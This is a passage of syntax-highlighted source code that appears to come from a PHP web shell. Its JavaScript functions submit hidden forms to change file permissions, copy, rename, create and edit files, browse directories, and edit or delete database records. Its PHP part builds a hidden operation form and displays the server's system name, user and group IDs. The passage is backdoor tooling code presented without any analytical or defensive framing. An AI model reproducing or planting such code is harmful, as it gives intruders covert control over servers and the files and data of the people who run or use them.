<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">var</span> <span style="color: #f57900; font-weight: bold;">newperm</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #f57900; font-weight: bold;">newperm</span> = <span style="color: #eeeeec; background-color: #2e3436;">prompt(</span><span style="color: #ad7fa8; font-style: italic;">'Current file:'</span>+<span style="color: #f57900; font-weight: bold;">pfile</span>+<span style="color: #ad7fa8; font-style: italic;">'\nPlease input new attribute:'</span>, <span style="color: #ad7fa8; font-style: italic;">''</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!<span style="color: #f57900; font-weight: bold;">newperm</span>) <span style="color: #729fcf; font-weight: bold;">return</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'fileperm'</span>).<span style="color: #f57900; font-weight: bold;">newperm</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">newperm</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'fileperm'</span>).<span style="color: #f57900; font-weight: bold;">pfile</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">pfile</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'fileperm'</span>).<span style="color: #eeeeec; background-color: #2e3436;">submit(</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">copyfile</span>(<span style="color: #f57900; font-weight: bold;">sname</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">var</span> <span style="color: #f57900; font-weight: bold;">tofile</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #f57900; font-weight: bold;">tofile</span> = <span style="color: #eeeeec; background-color: #2e3436;">prompt(</span><span style="color: #ad7fa8; font-style: italic;">'Original file:'</span>+<span style="color: #f57900; font-weight: bold;">sname</span>+<span style="color: #ad7fa8; font-style: italic;">'\nPlease input object file (fullpath):'</span>, <span style="color: #ad7fa8; font-style: italic;">''</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!<span style="color: #f57900; font-weight: bold;">tofile</span>) <span style="color: #729fcf; font-weight: bold;">return</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'copyfile'</span>).<span style="color: #f57900; font-weight: bold;">tofile</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">tofile</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'copyfile'</span>).<span style="color: #f57900; font-weight: bold;">sname</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">sname</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'copyfile'</span>).<span style="color: #eeeeec; background-color: #2e3436;">submit(</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">rename</span>(<span style="color: #f57900; font-weight: bold;">oldname</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">var</span> <span style="color: #f57900; font-weight: bold;">newfilename</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #f57900; font-weight: bold;">newfilename</span> = <span style="color: #eeeeec; background-color: #2e3436;">prompt(</span><span style="color: #ad7fa8; font-style: italic;">'Former file name:'</span>+<span style="color: #f57900; font-weight: bold;">oldname</span>+<span style="color: #ad7fa8; font-style: italic;">'\nPlease input new filename:'</span>, <span style="color: #ad7fa8; font-style: italic;">''</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!<span style="color: #f57900; font-weight: bold;">newfilename</span>) <span style="color: #729fcf; font-weight: bold;">return</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'rename'</span>).<span style="color: #f57900; font-weight: bold;">newfilename</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">newfilename</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'rename'</span>).<span style="color: #f57900; font-weight: bold;">oldname</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">oldname</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'rename'</span>).<span style="color: #eeeeec; background-color: #2e3436;">submit(</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">dofile</span>(<span style="color: #f57900; font-weight: bold;">doing</span>,<span style="color: #f57900; font-weight: bold;">thefile</span>,<span style="color: #f57900; font-weight: bold;">m</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #f57900; font-weight: bold;">m</span> &amp;&amp; !<span style="color: #eeeeec; background-color: #2e3436;">confirm(</span><span style="color: #f57900; font-weight: bold;">m</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'filelist'</span>).<span style="color: #f57900; font-weight: bold;">doing</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">doing</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #f57900; font-weight: bold;">thefile</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'filelist'</span>).<span style="color: #f57900; font-weight: bold;">thefile</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">thefile</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'filelist'</span>).<span style="color: #eeeeec; background-color: #2e3436;">submit(</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">createfile</span>(<span style="color: #f57900; font-weight: bold;">nowpath</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">var</span> <span style="color: #f57900; font-weight: bold;">filename</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #f57900; font-weight: bold;">filename</span> = <span style="color: #eeeeec; background-color: #2e3436;">prompt(</span><span style="color: #ad7fa8; font-style: italic;">'Please input the file name:'</span>, <span style="color: #ad7fa8; font-style: italic;">''</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!<span style="color: #f57900; font-weight: bold;">filename</span>) <span style="color: #729fcf; font-weight: bold;">return</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">opfile(</span><span style="color: #ad7fa8; font-style: italic;">'editfile'</span>,<span style="color: #f57900; font-weight: bold;">nowpath</span> + <span style="color: #f57900; font-weight: bold;">filename</span>,<span style="color: #f57900; font-weight: bold;">nowpath</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">opfile</span>(<span style="color: #f57900; font-weight: bold;">action</span>,<span style="color: #f57900; font-weight: bold;">opfile</span>,<span style="color: #f57900; font-weight: bold;">dir</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'fileopform'</span>).<span style="color: #f57900; font-weight: bold;">action</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">action</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'fileopform'</span>).<span style="color: #f57900; font-weight: bold;">opfile</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">opfile</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'fileopform'</span>).<span style="color: #f57900; font-weight: bold;">dir</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">dir</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'fileopform'</span>).<span style="color: #eeeeec; background-color: #2e3436;">submit(</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">godir</span>(<span style="color: #f57900; font-weight: bold;">dir</span>,<span style="color: #f57900; font-weight: bold;">view_writable</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #f57900; font-weight: bold;">view_writable</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'godir'</span>).<span style="color: #f57900; font-weight: bold;">view_writable</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">view_writable</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'godir'</span>).<span style="color: #f57900; font-weight: bold;">dir</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">dir</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'godir'</span>).<span style="color: #eeeeec; background-color: #2e3436;">submit(</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">getsize</span>(<span style="color: #f57900; font-weight: bold;">getdir</span>,<span style="color: #f57900; font-weight: bold;">dir</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'getsize'</span>).<span style="color: #f57900; font-weight: bold;">getdir</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">getdir</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'getsize'</span>).<span style="color: #f57900; font-weight: bold;">dir</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">dir</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'getsize'</span>).<span style="color: #eeeeec; background-color: #2e3436;">submit(</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">editrecord</span>(<span style="color: #f57900; font-weight: bold;">action</span>, <span style="color: #f57900; font-weight: bold;">base64</span>, <span style="color: #f57900; font-weight: bold;">tablename</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #f57900; font-weight: bold;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'del'</span>) {<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!<span style="color: #eeeeec; background-color: #2e3436;">confirm(</span><span style="color: #ad7fa8; font-style: italic;">'Is or isn\'t deletion record?'</span>)) <span style="color: #729fcf; font-weight: bold;">return</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'recordlist'</span>).<span style="color: #f57900; font-weight: bold;">doing</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">action</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'recordlist'</span>).<span style="color: #f57900; font-weight: bold;">base64</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">base64</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'recordlist'</span>).<span style="color: #f57900; font-weight: bold;">tablename</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">tablename</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'recordlist'</span>).<span style="color: #eeeeec; background-color: #2e3436;">submit(</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">moddbname</span>(<span style="color: #f57900; font-weight: bold;">dbname</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(!<span style="color: #f57900; font-weight: bold;">dbname</span>) <span style="color: #729fcf; font-weight: bold;">return</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'setdbname'</span>).<span style="color: #f57900; font-weight: bold;">dbname</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">dbname</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'setdbname'</span>).<span style="color: #eeeeec; background-color: #2e3436;">submit(</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">settable</span>(<span style="color: #f57900; font-weight: bold;">tablename</span>,<span style="color: #f57900; font-weight: bold;">doing</span>,<span style="color: #f57900; font-weight: bold;">page</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(!<span style="color: #f57900; font-weight: bold;">tablename</span>) <span style="color: #729fcf; font-weight: bold;">return</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #f57900; font-weight: bold;">doing</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'settable'</span>).<span style="color: #f57900; font-weight: bold;">doing</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">doing</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #f57900; font-weight: bold;">page</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'settable'</span>).<span style="color: #f57900; font-weight: bold;">page</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">page</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'settable'</span>).<span style="color: #f57900; font-weight: bold;">tablename</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">tablename</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'settable'</span>).<span style="color: #eeeeec; background-color: #2e3436;">submit(</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">s</span>(<span style="color: #f57900; font-weight: bold;">action</span>,<span style="color: #f57900; font-weight: bold;">nowpath</span>,<span style="color: #f57900; font-weight: bold;">p1</span>,<span style="color: #f57900; font-weight: bold;">p2</span>,<span style="color: #f57900; font-weight: bold;">p3</span>,<span style="color: #f57900; font-weight: bold;">p4</span>,<span style="color: #f57900; font-weight: bold;">p5</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #f57900; font-weight: bold;">action</span>) <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'opform'</span>).<span style="color: #f57900; font-weight: bold;">action</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">action</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #f57900; font-weight: bold;">nowpath</span>) <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'opform'</span>).<span style="color: #f57900; font-weight: bold;">nowpath</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">nowpath</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #f57900; font-weight: bold;">p1</span>) <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'opform'</span>).<span style="color: #f57900; font-weight: bold;">p1</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">p1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #f57900; font-weight: bold;">p2</span>) <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'opform'</span>).<span style="color: #f57900; font-weight: bold;">p2</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">p2</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #f57900; font-weight: bold;">p3</span>) <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'opform'</span>).<span style="color: #f57900; font-weight: bold;">p3</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">p3</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #f57900; font-weight: bold;">p4</span>) <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'opform'</span>).<span style="color: #f57900; font-weight: bold;">p4</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">p4</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #f57900; font-weight: bold;">p5</span>) <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'opform'</span>).<span style="color: #f57900; font-weight: bold;">p4</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">p5</span>;
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">g</span>(<span style="color: #f57900; font-weight: bold;">action</span>,<span style="color: #f57900; font-weight: bold;">nowpath</span>,<span style="color: #f57900; font-weight: bold;">p1</span>,<span style="color: #f57900; font-weight: bold;">p2</span>,<span style="color: #f57900; font-weight: bold;">p3</span>,<span style="color: #f57900; font-weight: bold;">p4</span>,<span style="color: #f57900; font-weight: bold;">p5</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(!<span style="color: #f57900; font-weight: bold;">action</span>) <span style="color: #729fcf; font-weight: bold;">return</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">s(</span><span style="color: #f57900; font-weight: bold;">action</span>,<span style="color: #f57900; font-weight: bold;">nowpath</span>,<span style="color: #f57900; font-weight: bold;">p1</span>,<span style="color: #f57900; font-weight: bold;">p2</span>,<span style="color: #f57900; font-weight: bold;">p3</span>,<span style="color: #f57900; font-weight: bold;">p4</span>,<span style="color: #f57900; font-weight: bold;">p5</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'opform'</span>).<span style="color: #eeeeec; background-color: #2e3436;">submit(</span>);
}
<span style="color: #8ae234;">&lt;/script&gt;</span>
<span style="color: #8ae234;">&lt;/head&gt;</span>
<span style="color: #8ae234;">&lt;body</span> <span style="color: #8ae234;">style=</span><span style="color: #ad7fa8; font-style: italic;">"margin:0;table-layout:fixed; word-break:break-all"</span><span style="color: #8ae234;">&gt;</span>
<span style="color: #729fcf;">&lt;?php</span>
<span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=<span style="color: #8ae234;">&gt;</span><span style="color: #ad7fa8; font-style: italic;">'opform'</span>));
<span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>, $<span style="color: #eeeeec;">action</span>);
<span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'nowpath'</span>, $<span style="color: #eeeeec;">nowpath</span>);
<span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'p1'</span>, $<span style="color: #eeeeec;">p1</span>);
<span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'p2'</span>, $<span style="color: #eeeeec;">p2</span>);
<span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'p3'</span>, $<span style="color: #eeeeec;">p3</span>);
<span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'p4'</span>, $<span style="color: #eeeeec;">p4</span>);
<span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'p5'</span>, $<span style="color: #eeeeec;">p5</span>);
<span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);

<span style="color: #729fcf; font-weight: bold;">if</span>(!<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'posix_getegid'</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">user</span> = @<span style="color: #eeeeec; background-color: #2e3436;">get_current_user(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">uid</span> = @<span style="color: #eeeeec; background-color: #2e3436;">getmyuid(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">gid</span> = @<span style="color: #eeeeec; background-color: #2e3436;">getmygid(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">group</span> = <span style="color: #ad7fa8; font-style: italic;">"?"</span>;
} <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">uid</span> = @<span style="color: #eeeeec; background-color: #2e3436;">posix_getpwuid(</span>@<span style="color: #eeeeec; background-color: #2e3436;">posix_geteuid(</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">gid</span> = @<span style="color: #eeeeec; background-color: #2e3436;">posix_getgrgid(</span>@<span style="color: #eeeeec; background-color: #2e3436;">posix_getegid(</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">user</span> = $<span style="color: #eeeeec;">uid</span>[<span style="color: #ad7fa8; font-style: italic;">'name'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">uid</span> = $<span style="color: #eeeeec;">uid</span>[<span style="color: #ad7fa8; font-style: italic;">'uid'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">group</span> = $<span style="color: #eeeeec;">gid</span>[<span style="color: #ad7fa8; font-style: italic;">'name'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">gid</span> = $<span style="color: #eeeeec;">gid</span>[<span style="color: #ad7fa8; font-style: italic;">'gid'</span>];
}

<span style="color: #729fcf;">?&gt;</span>
<span style="color: #8ae234;">&lt;table</span> <span style="color: #8ae234;">width=</span><span style="color: #ad7fa8; font-style: italic;">"100%"</span> <span style="color: #8ae234;">border=</span><span style="color: #ad7fa8; font-style: italic;">"0"</span> <span style="color: #8ae234;">cellpadding=</span><span style="color: #ad7fa8; font-style: italic;">"0"</span> <span style="color: #8ae234;">cellspacing=</span><span style="color: #ad7fa8; font-style: italic;">"0"</span><span style="color: #8ae234;">&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;tr</span> <span style="color: #8ae234;">class=</span><span style="color: #ad7fa8; font-style: italic;">"head"</span><span style="color: #8ae234;">&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;td&gt;&lt;span</span> <span style="color: #8ae234;">style=</span><span style="color: #ad7fa8; font-style: italic;">"float:right;"</span><span style="color: #8ae234;">&gt;</span><span style="color: #729fcf;">&lt;?php</span> <span style="color: #729fcf; font-weight: bold;">echo</span> @<span style="color: #eeeeec; background-color: #2e3436;">php_uname(</span>);<span style="color: #729fcf;">?&gt;</span> / <span style="color: #f57900; font-weight: bold;">User</span>:<span style="color: #729fcf;">&lt;?php</span> <span style="color: #729fcf; font-weight: bold;">echo</span> $<span style="color: #eeeeec;">uid</span>.<span style="color: #ad7fa8; font-style: italic;">' ( '</span>.$<span style="color: #eeeeec;">user</span>.<span style="color: #ad7fa8; font-style: italic;">' ) / Group: '</span>.$<span style="color: #eeeeec;">gid</span>.<span style="color: #ad7fa8; font-style: italic;">' ( '</span>.$<span 